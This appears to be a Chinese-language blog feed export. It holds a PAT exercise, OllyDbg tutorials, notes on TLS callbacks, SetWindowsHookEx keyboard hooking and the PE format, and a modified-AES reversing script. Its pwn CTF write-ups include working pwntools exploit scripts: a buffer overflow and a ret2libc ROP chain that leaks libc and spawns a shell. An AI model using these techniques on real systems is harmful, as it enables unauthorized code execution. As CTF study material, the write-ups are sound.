</code></pre>
<h3 id="输出样例：-2"><a href="#输出样例：-2" class="headerlink" title="输出样例："></a>输出样例：</h3><pre><code class="out">7 6
</code></pre>
<p>解答：</p>
<ol>
<li>这里输入的数用一个数组进行存放；</li>
<li>然后用另外的数组arr进行记录n运算过程中出现某些数，出现过记录为1，其他为0；</li>
<li>然后进行存放数据的数组进行排序；</li>
<li>然后遍历数组，arr为0的位置输出即可</li>
<li>这里虽然数n小于100，但是如果是99就会×3+1，必然会大于100，这里arr数组尽可能地大</li>
<li>由于数组一需要排序，为了方便我们用了vector容器</li>
<li>这里sort用了lambda表达式，效率不知道怎么样，够帅就行哈哈</li>
<li>然后就是输出了，这里每次因为不一定会输出数，也不一定会输出空格，所以没有公共部分，只能用if过滤了</li>
<li>这里用了一个flag来记录是否输出空格，还是采用“     ”+数的形式</li>
</ol>
<pre><code class="c++">#include&lt;iostream&gt;
#include&lt;vector&gt;
#include&lt;algorithm&gt;
using namespace std;
int arr[100000];
int main(void)&#123;
    int n,tmp,k;
    cin &gt;&gt; k;
    vector&lt;int&gt; v(k);
    for(int i=0;i&lt;k;i++)&#123;
        cin &gt;&gt; n;
        v[i] = n;
        for(;n != 1;)&#123;
                if(n%2) n = (3*n + 1);
                n /= 2;	
                if(arr[n]==1) break;
                arr[n] = 1;
        &#125;
    &#125;
    sort(v.begin(),v.end(),[](int a,int b)&#123;return a &gt; b;&#125;);
    for(int i=0,flag = 0;i&lt;k;i++)&#123;
        if(arr[v[i]] == 0) &#123;
            if(flag) &#123; cout &lt;&lt; &quot; &quot;;&#125;
            cout &lt;&lt; v[i]; 
            flag = 1; 
        &#125;
        
    &#125;
    return 0;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>PAT练习</category>
      </categories>
  </entry>
  <entry>
    <title>re_base1</title>
    <url>/2022/12/17/re-base1/</url>
    <content><![CDATA[<p>re_OD debugger1</p>
<span id="more"></span>

<h1 id="查找main函数的五种方法"><a href="#查找main函数的五种方法" class="headerlink" title="查找main函数的五种方法"></a>查找main函数的五种方法</h1><p>运行程序，看见弹窗，盲猜是user32.GetmessageW()的api</p>
<p><img src="/./../images/image-20221217212124141.png" alt="image-20221217212124141"></p>
<p>方法一：</p>
<p>1.不断地F7步入函数</p>
<p>2.看见一些红色api，即一些库函数，就Ctrl+F9跳出此函数</p>
<p><img src="/./../images/image-20221217212358112.png" alt="image-20221217212358112"></p>
<p>3.直到看见弹窗函数</p>
<p>方法二：</p>
<p>1.不断地F8步过函数</p>
<p>2.直到某个函数执行了弹窗函数，然后在此函数之上下断，然后ctrl+F2重新开始</p>
<p>3.直到找到弹窗函数</p>
<p>方法三：</p>
<p>1.通过查找api的方式查找main函数</p>
<p>2.右键查看模块间的调用函数</p>
<p><img src="/./../images/image-20221217212828911.png" alt="image-20221217212828911"></p>
<p>3.找到弹窗函数即可</p>
<p>方法四：</p>
<p>1.Ctrl+n查找所有内存的api</p>
<p><img src="/./../images/image-20221217213116702.png" alt="image-20221217213116702"></p>
<p>方法五：</p>
<p>1.查找字符串,右键即可</p>
<p>这里修改dump窗口的数据，选中数据后摁ctrl+E</p>
<p><img src="/./../images/image-20221217213430348.png" alt="image-20221217213430348"></p>
<p>修改后右键复制到文件</p>
<p><img src="/./../images/image-20221217213520134.png" alt="image-20221217213520134"></p>
<p>在dump窗口中，右键保存文件即可</p>
<p><img src="/./../images/image-20221217213618822.png" alt="image-20221217213618822"></p>
]]></content>
      <categories>
        <category>re</category>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>OD</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn_practice1</title>
    <url>/2023/01/13/pwn-practice1/</url>
    <content><![CDATA[<p>pwn</p>
<span id="more"></span>

<h2 id="hgame2018-flag-server"><a href="#hgame2018-flag-server" class="headerlink" title="hgame2018_flag_server"></a>hgame2018_flag_server</h2><h3 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h3><pre><code class="dockerfile">docker run -v &quot;$(pwd):/ctf/work&quot; -i -t skysider/pwndocker /bin/bash
</code></pre>
<p><img src="/./../images/image-20230113115308826.png" alt="image-20230113115308826"></p>
<h3 id="程序核心逻辑"><a href="#程序核心逻辑" class="headerlink" title="程序核心逻辑"></a>程序核心逻辑</h3><p>这里有个随机值，输入的值和随机值比较</p>
<p><img src="/./../images/image-20230113115524208.png" alt="image-20230113115524208"></p>
<p>我准备用逆向的守法，来搞它，写了个cpp，结果运行多次结果都不一样</p>
<pre><code class="cpp">#include&lt;time.h&gt;
#include&lt;stdio.h&gt;
#include&lt;random&gt;

int main(void)&#123;
    unsigned  int v3 = time(0);
    printf(&quot;%d\n&quot;,v3);
    srand(v3);
    int v8 = rand();
    printf(&quot;%u&quot;,v8);
    return 1;
&#125; 
</code></pre>
<p>giao~~~~~</p>
<p>然后我只能老老实实找漏洞了</p>
<p>先是发现可以读取字符串name<img src="/./../images/image-20230113115909861.png" alt="image-20230113115909861"></p>
<p>找到读取字符串的函数是自己编的<img src="/./../images/image-20230113115811014.png" alt="image-20230113115811014"></p>
<p>最后v10进行检验<img src="/./../images/image-20230113115933550.png" alt="image-20230113115933550"></p>
<p>这里看栈分布<img src="/./../images/image-20230113120005292.png" alt="image-20230113120005292"></p>
<p>直接在s1的下面，直接填充’A’*((0x50-0x10)+size(int))</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="py">from pwn import *

io = remote(&#39;node4.buuoj.cn&#39;,28388)
# io = process(&#39;./flag_server&#39;)
io.sendlineafter(&#39;your username length: &#39;,b&#39;-1&#39;)
io.sendline(b&#39;A&#39;*0x44)
io.interactive()
io.close()
</code></pre>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/./../images/image-20230113120243209.png" alt="image-20230113120243209"></p>
<hr>
<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="核心程序"><a href="#核心程序" class="headerlink" title="核心程序"></a>核心程序</h3><p><img src="/./../images/image-20230113201822956.png" alt="image-20230113201822956"></p>
<p><strong>利用点</strong>：利用gets，去覆盖栈中的内容，利用rop链泄漏puts函数在内存中的地址，然后通过这个地址去找对应版本的libc，找到内存中system的地址和bin_sh字符串的地址，再利用一次rop链执行system函数即可</p>
<p>这里有一个模块叫LibcSearcher，它可以让使用者不用担心本地和远程的libc是否统一，它可以帮你去寻找正在执行的libc。非常好用</p>
<h3 id="寻找rop"><a href="#寻找rop" class="headerlink" title="寻找rop"></a>寻找rop</h3><p>目的：寻找pop rdi ret;指令，因为该文件是64位，而64位文件采用寄存器存放参数，第一个参数存放的寄存器就是rdi</p>
<p>命令：</p>
<pre><code class="bash">ROPgadget --binary ./ciscn_2019_c_1 --only &#39;pop|ret&#39;
</code></pre>
<p>结果：</p>
<p><img src="/./../images/image-20230113202715207.png" alt="image-20230113202715207"></p>
<h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><pre><code class="py">from pwn import *
from LibcSearcher import *

# io = process(&#39;./ciscn_2019_c_1&#39;)
io = remote(&quot;node4.buuoj.cn&quot;,26320)
elf = ELF(&#39;ciscn_2019_c_1&#39;)
#
encrypt_addr = elf.sym[&#39;encrypt&#39;]
puts_got = elf.got[&#39;puts&#39;]	# 用于打印puts的地址
puts_plt = elf.plt[&#39;puts&#39;]	# puts函数地址
rdi_ret = 0x400c83
                                            # puts函数的参数		puts函数的地址	puts函数执行完的返回地址，用于下一次的shellcode
payload1 = b&#39;A&#39; * 0x50 + p64(0) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)

io.sendlineafter(b&#39;Input your choice!&#39;,b&#39;1&#39;)
io.sendlineafter(b&#39;Input your Plaintext to be encrypted&#39;,payload1)
io.recvuntil(b&#39;Ciphertext\n&#39;)
io.recvuntil(b&#39;\n&#39;)
# 拿到puts在内存中的地址
puts_addr = u64(io.recvline().strip().ljust(8,b&#39;\0&#39;))
print(&#39;addr:&#39;,hex(puts_addr))

# 找内存libc的地址
libc = LibcSearcher(&#39;puts&#39;,puts_addr)

addr_base = puts_addr - libc.dump(&quot;puts&quot;)
print(&#39;libc&#39;,addr_base)
sys_addr = libc.dump(&#39;system&#39;) + addr_base
binsh_addr = libc.dump(&#39;str_bin_sh&#39;) + addr_base

payload2 = b&#39;A&#39; * 0x50 + p64(0) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr)

io.sendlineafter(b&#39;Input your Plaintext to be encrypted&#39;,payload2)
io.interactive()

</code></pre>
<h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p><img src="/./../images/image-20230113203306010.png" alt="image-20230113203306010"></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>赛题复现wp</category>
      </categories>
  </entry>
  <entry>
    <title>re_base2</title>
    <url>/2022/12/21/re-base2/</url>
    <content><![CDATA[<p>TLS and keyboard hooking</p>
<span id="more"></span>

<h1 id="TLS回调"><a href="#TLS回调" class="headerlink" title="TLS回调"></a>TLS回调</h1><p>TLS(Thread Local Storage) 线程本地存储，主要用于提供本地线程访问局部数据的句柄。</p>
<p>下面来一段官方解释：</p>
<p>使用线程<em>本地存储</em> （TLS），可以为进程可以使用全局索引访问的每个线程提供唯一数据。一个线程分配索引，其他线程可以使用它来检索与索引关联的唯一数据</p>
<p>原理图：</p>
<p><img src="/./../images/image-20221221220303818.png" alt="image-20221221220303818"></p>
<p>&#x3D;&#x3D;TLS主要用于程序的反调试检测&#x3D;&#x3D;</p>
<p>它在运行EP（entrypoint 程序入口代码）代码前执行</p>
<h6 id="TLS结构体："><a href="#TLS结构体：" class="headerlink" title="TLS结构体："></a>TLS结构体：</h6><p><img src="/./../images/image-20221221220612843.png" alt="image-20221221220612843"></p>
<p>可以看到TLS结构体中保存着回调函数的地址</p>
<p>可以打开CFF explore软件直接查看存放TLS回调函数数组的地址</p>
<p><img src="/./../images/image-20221221221105861.png" alt="image-20221221221105861"></p>
<p>打开od查看它的地址为401000</p>
<p><img src="/./../images/image-20221221221841170.png" alt="image-20221221221841170"></p>
<p>汇编直接定位过去就出来了</p>
<p><img src="/./../images/image-20221221221931378.png" alt="image-20221221221931378"></p>
<p>TLS回调函数是在进程或线程创建或终止时调用，如果某个进程存在一个线程，那从程序的创建到销毁需要4次调用回调函数</p>
<p>TLS回调函数定义：</p>
<p><img src="/./../images/image-20221221222309417.png" alt="image-20221221222309417"></p>
<p>注册TLS程序示例代码：</p>
<pre><code class="c">#include &lt;windows.h&gt;

#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)

void print_console(char* szMsg)
&#123;
    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);

    WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);
&#125;

void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)
&#123;
    char szMsg[80] = &#123;0,&#125;;
    wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\n&quot;, DllHandle, Reason);
    print_console(szMsg);
&#125;

void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)
&#123;
    char szMsg[80] = &#123;0,&#125;;
    wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\n&quot;, DllHandle, Reason);
    print_console(szMsg);
&#125;

#pragma data_seg(&quot;.CRT$XLX&quot;)
    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;
#pragma data_seg()

DWORD WINAPI ThreadProc(LPVOID lParam)
&#123;
    print_console(&quot;ThreadProc() start\n&quot;);

    print_console(&quot;ThreadProc() end\n&quot;);

    return 0;
&#125;

int main(void)
&#123;
    HANDLE hThread = NULL;

    print_console(&quot;main() start\n&quot;);

    hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
    WaitForSingleObject(hThread, 60*1000);
    CloseHandle(hThread);

    print_console(&quot;main() end\n&quot;);

    return 0;
&#125;
</code></pre>
<h5 id="调试TLS回调函数"><a href="#调试TLS回调函数" class="headerlink" title="调试TLS回调函数"></a>调试TLS回调函数</h5><p>直接在运行前设置调试选项</p>
<p><img src="/./../images/image-20221221222931558.png" alt="image-20221221222931558"></p>
<p>添加TLS这里不做阐述</p>
<hr>
<h1 id="keyboard-hooking"><a href="#keyboard-hooking" class="headerlink" title="keyboard hooking"></a>keyboard hooking</h1><p>消息钩取工作原理</p>
<p><img src="/./../images/image-20221222102644542.png" alt="image-20221222102644542"></p>
<p>使用SetWindowsHookEx()可以实现消息钩子，钩子函数需要存在于dll文件中，由操作系统调用回调函数</p>
<p>API定义：</p>
<p><img src="/./../images/image-20221222103023824.png" alt="image-20221222103023824"></p>
<p>在某进程拥有消息，操作系统就会将dll注入进程序中，实现消息钩取</p>
<p>只需要一个程序加载安装钩子所在的dll程序，然后SetWindowsHookEx()注册钩子，操作系统就会检测每一个程序的行为，一旦发生键盘输入，就将dll文件注入。</p>
<p>加载dll注册hook实例：</p>
<pre><code class="c">#include &quot;stdio.h&quot;
#include &quot;conio.h&quot;
#include &quot;windows.h&quot;

#define	DEF_DLL_NAME		&quot;KeyHook.dll&quot;
#define	DEF_HOOKSTART		&quot;HookStart&quot;
#define	DEF_HOOKSTOP		&quot;HookStop&quot;

typedef void (*PFN_HOOKSTART)();
typedef void (*PFN_HOOKSTOP)();

void main()
&#123;
    HMODULE			hDll = NULL;
    PFN_HOOKSTART	HookStart = NULL;
    PFN_HOOKSTOP	HookStop = NULL;
    char			ch = 0;

    // KeyHook.dll 肺爹
    hDll = LoadLibraryA(DEF_DLL_NAME);
    if( hDll == NULL )
    &#123;
        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());
        return;
    &#125;

    // export 窃荐 林家 掘扁
    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);
    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);

    // 饶欧 矫累
    HookStart();

    // 荤侩磊啊 &#39;q&#39; 甫 涝仿且 锭鳖瘤 措扁
    printf(&quot;press &#39;q&#39; to quit!\n&quot;);
    while( _getch() != &#39;q&#39; )	;

    // 饶欧 辆丰
    HookStop();
    
    // KeyHook.dll 攫肺爹
    FreeLibrary(hDll);
&#125;
</code></pre>
<p>dll代码：</p>
<pre><code class="c">#include &quot;stdio.h&quot;
#include &quot;windows.h&quot;

#define DEF_PROCESS_NAME		&quot;notepad.exe&quot;

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
&#123;
    switch( dwReason )
    &#123;
        case DLL_PROCESS_ATTACH:
            g_hInstance = hinstDLL;
            break;

        case DLL_PROCESS_DETACH:
            break;	
    &#125;

    return TRUE;
&#125;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
&#123;
    char szPath[MAX_PATH] = &#123;0,&#125;;
    char *p = NULL;

    if( nCode &gt;= 0 )
    &#123;
        // bit 31 : 0 =&gt; press, 1 =&gt; release
        if( !(lParam &amp; 0x80000000) )
        &#123;
            GetModuleFileNameA(NULL, szPath, MAX_PATH);
            p = strrchr(szPath, &#39;\\&#39;);

            // 泅犁 橇肺技胶 捞抚阑 厚背秦辑 父距 notepad.exe 扼搁 0 酒囱 蔼阑 府畔窃
            // =&gt; 0 酒囱 蔼阑 府畔窍搁 皋矫瘤绰 促澜栏肺 傈崔登瘤 臼澜
            if( !_stricmp(p + 1, DEF_PROCESS_NAME) )
                return 1;
        &#125;
    &#125;

    // 老馆利牢 版快俊绰 CallNextHookEx() 甫 龋免窍咯
    //   览侩橇肺弊伐 (趣篮 促澜 扰) 栏肺 皋矫瘤甫 傈崔窃
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
&#125;

#ifdef __cplusplus
extern &quot;C&quot; &#123;
#endif
    __declspec(dllexport) void HookStart()
    &#123;
        g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);
    &#125;

    __declspec(dllexport) void HookStop()
    &#123;
        if( g_hHook )
        &#123;
            UnhookWindowsHookEx(g_hHook);
            g_hHook = NULL;
        &#125;
    &#125;
#ifdef __cplusplus
&#125;
#endif
</code></pre>
<h5 id="调试hook"><a href="#调试hook" class="headerlink" title="调试hook"></a>调试hook</h5><p>用字符串搜索直接定位到main函数</p>
<p><img src="/./../images/image-20221222110634215.png" alt="image-20221222110634215"></p>
<p>上面得到hookStart地址，然后call，F7直接步入就能进入hookstart函数</p>
<p><img src="/./../images/image-20221222111024672.png" alt="image-20221222111024672"></p>
<p>这里就是dll中注册键盘hook</p>
<p>直接根据注册时得到的地址进行跳转就能得到hook函数</p>
<p><img src="/./../images/image-20221222111311777.png" alt="image-20221222111311777"></p>
<p>也可以打开notepad，进行附加attach，先摁F9，让hook注册成功</p>
<p>然后在新加一个模块处停止，option设置</p>
<p><img src="/./../images/image-20221222111708005.png" alt="image-20221222111708005"></p>
<p>附加后在键盘输入字母，od会立马断住。</p>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
  </entry>
  <entry>
    <title>re_base3</title>
    <url>/2022/12/22/re-base3/</url>
    <content><![CDATA[<p>PE and IAT hook</p>
<span id="more"></span>

<h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><p>由于了解IAT,需要了解一点PE,这里把PE也给写了吧</p>
<p>PE文件种类：</p>
<p><img src="/./../images/image-20221222193952005.png" alt="image-20221222193952005"></p>
<p>OBJ文件不能执行，dll和sys文件需要调试器执行或者服务和程序加载执行</p>
<p>DOS签名和PE签名</p>
<p><img src="/./../images/image-20221222194231640.png" alt="image-20221222194231640"></p>
<p>PE文件大体分为：1.PE头、2.PE体</p>
<p>1.PE头</p>
<ul>
<li>DOS签名</li>
<li>DOS存根</li>
<li>NT头</li>
<li>一系列节区头<ul>
<li>.data(数据)</li>
<li>.text(代码)</li>
<li>.rsrc(资源)</li>
</ul>
</li>
</ul>
<p>2.PE体：一系列节区</p>
<p>名词介绍：</p>
<p>​	VA:virtual address 绝对虚拟内存地址</p>
<p>​	RVA:相对虚拟内存地址</p>
<p>​	VA &#x3D; RVA + imageBase</p>
<p>DOS头结构体：唯一有用的就是e_magic和e_lfanew</p>
<p><img src="/./../images/image-20221222195650362.png" alt="image-20221222195650362"></p>
<p>其中e_magic就是Dos签名，e_lfanew就是NT头的偏移</p>
<h5 id="DOS存根"><a href="#DOS存根" class="headerlink" title="DOS存根"></a>DOS存根</h5><p>Dos存根是兼容dos系统的一种产物，可有可无，内容可用xp内置debug查看</p>
<p><img src="/./../images/image-20221222195853656.png" alt="image-20221222195853656"></p>
<p>内容是一段汇编代码，在dos系统中执行</p>
<h5 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h5><p>NT头结构体</p>
<p><img src="/./../images/image-20221222200235227.png" alt="image-20221222200235227"></p>
<p>签名不作介绍，文件头结构体：</p>
<p><img src="/./../images/image-20221222200349032.png" alt="image-20221222200349032"></p>
<p>Machine代表cpu类别</p>
<p>SizeOfOptionalHeader是表示可选头的大小</p>
<p>Characteristics表示文件是否是dll，是否可执行</p>
<p>NT可选头结构体：</p>
<p><img src="/./../images/image-20221222200743347.png" alt="image-20221222200743347"></p>
<p><img src="/./../images/image-20221222200759909.png" alt="image-20221222200759909"></p>
<p>NT可选头非常重要，它记录了很多重要的数据</p>
<p>ImageBase，是映像基址，映像指的是PE文件加载到内存的一种形态（我觉得更像是一种叫法），映像基址定义了文件加载进内存的基础地址</p>
<p>SectionAlignment, 节区对齐是文件在内存中的最小单位，文件在内存的大小应该是这个值的整数倍</p>
<p>FileAlignment, 文件对齐是文件在磁盘中的最小单位，文件在磁盘的大小应该是这个值的整数倍</p>
<p>Subsystem,子系统用来区分文件是sys驱动文件还是exe可执行文件</p>
<p><img src="/./../images/image-20221222201551009.png" alt="image-20221222201551009"></p>
<p>NumberOfRvaAndSizes , 记录DataDirectory数组的个数</p>
<p>DataDirectory：</p>
<p><img src="/./../images/image-20221222201756663.png" alt="image-20221222201756663"></p>
<p>节区头结构体：</p>
<p><img src="/./../images/image-20221222202014726.png" alt="image-20221222202014726"></p>
<p><img src="/./../images/image-20221222202552956.png" alt="image-20221222202552956"></p>
<p>这里的VirtualAddress是用RVA表示的</p>
<h5 id="RAV-to-RAW"><a href="#RAV-to-RAW" class="headerlink" title="RAV to RAW"></a>RAV to RAW</h5><p>RAW就是文件中节区的偏移（非内存）</p>
<p><img src="/./../images/image-20221222203627898.png" alt="image-20221222203627898"></p>
<h5 id="IAT导入地址表"><a href="#IAT导入地址表" class="headerlink" title="IAT导入地址表"></a>IAT导入地址表</h5><p>映像导入描述结构体：</p>
<p><img src="/./../images/image-20221222204623280.png" alt="image-20221222204623280"></p>
<p><img src="/./../images/image-20221222204719793.png" alt="image-20221222204719793"></p>
<p>文件导入多少个库文件，就有多少个 image_import_descriptor结构体</p>
<p>&#x3D;&#x3D;该结构体的地址保存在image_optional_header32.DataDirectory[1].VirtualAddress中&#x3D;&#x3D;</p>
<p><img src="/./../images/image-20221222210418625.png" alt="image-20221222210418625"></p>
<p>INT结构体保存着Image_import_by_name的指针</p>
<p>结构图：</p>
<p><img src="/./../images/image-20221222205449044.png" alt="image-20221222205449044"></p>
<p>PE装载器将导入函数加载到IAT的顺序：</p>
<p><img src="/./../images/image-20221222205721041.png" alt="image-20221222205721041"></p>
<h1 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h1><p>不想写了，和IAT差不多，一个导入一个导出</p>
<p>它的查找数据先是image_optional_header32.DataDirectory[0].VirtualAddress找到这个结构体，然后根据要找的函数名去AddressOfNames数组里面拿到下标，然后用下标再去Oridinal数组找，找到下标又去AddressOfFunction那里找函数地址</p>
<p>没有函数名直接用Ordinal查找，Ordinal数组存在的意义是我忘了。。反正就这样</p>
<p><img src="/./../images/image-20221222211536947.png" alt="image-20221222211536947"></p>
<p><img src="/./../images/image-20221222211514061.png" alt="image-20221222211514061"></p>
<hr>
<h1 id="IAT-hook"><a href="#IAT-hook" class="headerlink" title="IAT hook"></a>IAT hook</h1>]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
  </entry>
  <entry>
    <title>syc_level5</title>
    <url>/2022/12/19/syc-level5/</url>
    <content><![CDATA[<p>emmmmmmmmmmm,第一次做到魔改aes，有点激动记录一下吧</p>
<span id="more"></span>

<ol>
<li><p>魔改AES     </p>
<p><img src="/./../images/image-20221219210943381.png" alt="image-20221219210943381">       </p>
</li>
<li><p>这里做21次操作。但是无列混淆 <img src="/./../images/image-20221219210954851.png" alt="image-20221219210954851"></p>
</li>
<li><p>第一次做这种魔改aes，逆着就是先行移位，原先怎么移动，就逆回去 <img src="/./../images/image-20221219211019386.png" alt="image-20221219211019386"></p>
</li>
<li><p>然后再字节替换，也可以逆 </p>
</li>
<li><p>然后再轮密钥加，这个要从后往前，不然会影响字节替换，字节替换是必须要有顺序的 </p>
</li>
<li><p>最后就是每一个密文块的初始异或，该题除了第一块，其他都是拿密文块作为密匙</p>
</li>
</ol>
<p>结果：</p>
<pre><code class="python"># lesson5
def row_re(i):
    # 第二行
    v1 = a1[13+i*16]
    a1[13+i*16] = a1[9+i*16]
    a1[9+i*16] = a1[5+i*16]
    a1[5+i*16] = a1[1+i*16]
    a1[1+i*16] = v1
    # 第三行 不变
    v2 = a1[2+i*16]
    a1[2+i*16] = a1[10+i*16]
    a1[10+i*16] = v2
    v3 = a1[6+i*16]
    a1[6+i*16] = a1[14+i*16]
    a1[14+i*16] = v3
    # 第四行
    v4 = a1[15+i*16]
    a1[15+i*16] = a1[3+i*16]
    a1[3+i*16] = a1[7+i*16]
    a1[7+i*16] = a1[11+i*16]
    a1[11+i*16] = v4
    
a1 = [0xF8, 0x88, 0x9D, 0x31, 0xC7, 0x24, 0xD5, 0xF9, 0x45, 0x28, 0x9B, 0x7D, 0x42, 0x66, 0x65, 0x29, 0x2E, 0xC3, 0xC3, 0x5F, 0x1E, 0x1C, 0x43, 0xE9, 0x1E, 0xE1, 0xB9, 0xBD, 0x85, 0x5B, 0x7A, 0x39, 0xDE, 0xF6, 0xA7, 0xB8, 0xF5, 0xD2, 0xF9, 0xFE, 0xD9, 0xA0, 0x13, 0xF3, 0x43, 0xEF, 0xB2, 0x8A]
key_t = [0x58, 0x2F, 0x36, 0xDD, 0x92, 0xF2, 0x79, 0x09, 0xC8, 0x73, 0x6F, 0x0A, 0x36, 0x14, 0x6F, 0x43, 0xB7, 0x1A, 0x21, 0xD0, 0x25, 0xE8, 0x58, 0xD9, 0xED, 0x9B, 0x37, 0xD3, 0xDB, 0x8F, 0x58, 0x90, 0x55, 0x7D, 0x4C, 0x5C, 0x70, 0x95, 0x14, 0x85, 0x9D, 0x0E, 0x23, 0x56, 0x46, 0x81, 0x7B, 0xC6, 0x6C, 0xF6, 0x8D, 0x4F, 0x1C, 0x63, 0x99, 0xCA, 0x81, 0x6D, 0xBA, 0x9C, 0xC7, 0xEC, 0xC1, 0x5A, 0xA5, 0x79, 0x86, 0x50, 0xB9, 0x1A, 0x1F, 0x9A, 0x38, 0x77, 0xA5, 0x06, 0xFF, 0x9B, 0x64, 0x5C, 0x10, 0xBF, 0x28, 0x66, 0xA9, 0xA5, 0x37, 0xFC, 0x91, 0xD2, 0x92, 0xFA, 0x6E, 0x49, 0xF6, 0xA6, 0x42, 0xD6, 0x3C, 0x5E, 0xEB, 0x73, 0x0B, 0xA2, 0x7A, 0xA1, 0x99, 0x58, 0x14, 0xE8, 0x6F, 0xFE, 0x1D, 0xE3, 0x3A, 0xB3, 0xF6, 0x90, 0x31, 0x11, 0x8C, 0x31, 0xA8, 0x49, 0x98, 0xD9, 0xC7, 0xB7, 0x66, 0xFC, 0xE2, 0x77, 0x90, 0x6C, 0xD3, 0x66, 0x1C, 0x5D, 0x7B, 0x2F, 0x84, 0x84, 0xBC, 0x98, 0x70, 0x64, 0x26, 0x57, 0xE0, 0x08, 0xF5, 0x31, 0xFC, 0x55, 0x8E, 0x1E, 0x78, 0xD1, 0x32, 0x86, 0x36, 0xC2, 0x96, 0xDE, 0xD6, 0xCA, 0x63, 0xEF, 0x2A, 0x9F, 0xED, 0xF1, 0x52, 0x4E, 0xDF, 0x77, 0x63, 0xB1, 0xF2, 0x20, 0xB5, 0x7B, 0x91, 0xCF, 0x9F, 0xE4, 0x7C, 0x3E, 0xCD, 0xAA, 0xA3, 0x49, 0xF2, 0xD7, 0xE0, 0x5F, 0x47, 0xAC, 0x71, 0x90, 0xD8, 0x48, 0x0D, 0xAE, 0x15, 0xE2, 0xAE, 0xE7, 0xD5, 0xCC, 0x29, 0x03, 0x92, 0x60, 0x58, 0x93, 0x4A, 0x28, 0x55, 0x3D, 0x5F, 0xCA, 0xFB, 0xDA, 0x79, 0xCF, 0xD9, 0x07, 0xEB, 0xAF, 0x81, 0x94, 0xA1, 0x87, 0xD4, 0xA9, 0xFE, 0x4D, 0x2F, 0x73, 0x56, 0x36, 0xE5, 0x01, 0xBD, 0x99, 0x64, 0x95, 0x1C, 0x1E, 0xB0, 0x3C, 0xE2, 0x53, 0x9F, 0x4F, 0x13, 0x2E, 0x2F, 0x26, 0xAE, 0xB7, 0x4B, 0xB3, 0xB2, 0xA9, 0xFB, 0x8F, 0x50, 0xFA, 0x64, 0xC0, 0x85, 0xE8, 0x33, 0x8D, 0x2B, 0x5F, 0x78, 0x3E, 0x99, 0xF6, 0x83, 0xB1, 0xC9, 0x0C, 0xE7, 0x71, 0x04, 0x21, 0x0D, 0x43, 0x2F, 0x7E, 0x75, 0x7D, 0xB6, 0x88, 0xF6, 0xCC, 0x7F, 0x84, 0x11, 0xBD, 0x24, 0x6F, 0x4F, 0xD7, 0x0B, 0x11, 0x3A, 0xAA, 0xBD, 0x99, 0xCC, 0x66, 0xC2, 0x1D, 0xDD, 0xDB, 0x69, 0xAF, 0xC3, 0x88, 0x62, 0xBE, 0xF9, 0x22, 0xDF, 0x27, 0x35, 0x44, 0x1D, 0x3A, 0xE8, 0x9F, 0x61, 0x70, 0xDB, 0xC5, 0x03, 0xCE, 0x22, 0xE7, 0xDC, 0xE9, 0x17, 0xA3, 0xC1, 0xD3, 0xFF, 0x3C, 0x02]
